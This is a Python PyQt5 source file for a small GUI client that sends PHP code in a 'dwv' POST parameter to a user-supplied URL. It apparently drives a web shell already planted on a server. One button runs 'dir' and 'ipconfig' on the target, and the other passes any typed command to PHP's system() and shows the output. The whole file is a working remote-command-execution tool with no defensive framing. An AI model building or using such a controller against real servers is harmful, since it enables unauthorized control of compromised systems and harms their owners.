# -*- coding: utf-8 -*-
"""
Created on Mon Jul  5 14:16:16 2021

@author: USER
"""


from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLineEdit
from PyQt5.QtCore import QCoreApplication

import quicklinkUI as ui

import re
import requests

class start_window(QWidget, ui.Ui_Form):
    def __init__(self,parent=None):
        super(start_window,self).__init__(parent)
        self.setupUi(self)
        self.urlButton.clicked.connect(self.Link_onClick)
        self.cmdButton.clicked.connect(self.Control_onClick)
    
            

    def Link_onClick(self):
        # self.returnText.setText(self.url.text())
        url = self.url.toPlainText()
        param = {'dwv' : 'exec("dir",$output);print_r($output);system(ipconfig);'}
        response = requests.post(url ,data = param )
        response.encoding = 'Big5'
        if response.status_code == 200:
            self.returnText.setText(response.text)
        else:
            self.returnText.setText('status cod is not 200 , linked error.')
    
    def Control_onClick(self):
        url = self.url.toPlainText()
        cmdCode = self.command.toPlainText()
        param = {'dwv' : f'system("{cmdCode}");'}
        response = requests.post(url ,data = param )
        response.encoding = 'Big5'
        if response.status_code == 200:
            self.returnText.setText(response.text)
        else:
            self.returnText.setText('status cod is not 200 , linked error.')


if __name__ == '__main__':
    import sys
    app = QApplication(sys.argv)
    StartWin = start_window()
    StartWin.show()
    sys.exit(app.exec())
